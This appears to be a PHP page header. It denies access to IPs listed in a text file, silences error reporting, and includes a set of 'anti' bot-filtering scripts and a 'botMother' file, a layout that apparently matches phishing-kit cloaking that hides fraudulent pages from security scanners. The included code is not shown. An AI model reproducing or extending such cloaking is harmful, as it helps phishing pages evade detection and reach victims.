<?php
// Path to the text file containing blocked IPs
$blocked_ips_file = 'blocked_ips.txt';

// Check if the file exists
if (file_exists($blocked_ips_file)) {
    // Read the IPs into an array
    $blocked_ips = file($blocked_ips_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

    // Get the visitor's IP address
    $visitor_ip = $_SERVER['REMOTE_ADDR'];

    // Check if the visitor's IP is in the blocked list
    if (in_array($visitor_ip, $blocked_ips)) {
        // Display an error message or redirect to a forbidden page
        header('HTTP/1.1 403 Forbidden');
        echo 'Your access is denied.';
        exit; // Stop further execution of the script
    }
} else {
    // Log an error or handle missing file as needed
    error_log('Blocked IPs file not found: ' . $blocked_ips_file);
}
?>
<?php
session_start();
error_reporting(0);
include_once 'bots/saver/anti1.php';
include_once 'bots/saver/anti2.php';
include_once 'bots/saver/anti3.php';
include_once 'bots/saver/anti4.php';
include_once 'bots/saver/anti5.php';
include_once 'bots/saver/anti6.php';
include_once 'bots/saver/anti7.php';
include_once 'bots/saver/anti8.php';
include_once 'bots/botMother.php';
include_once 'bots/botnewunti.php';
?>
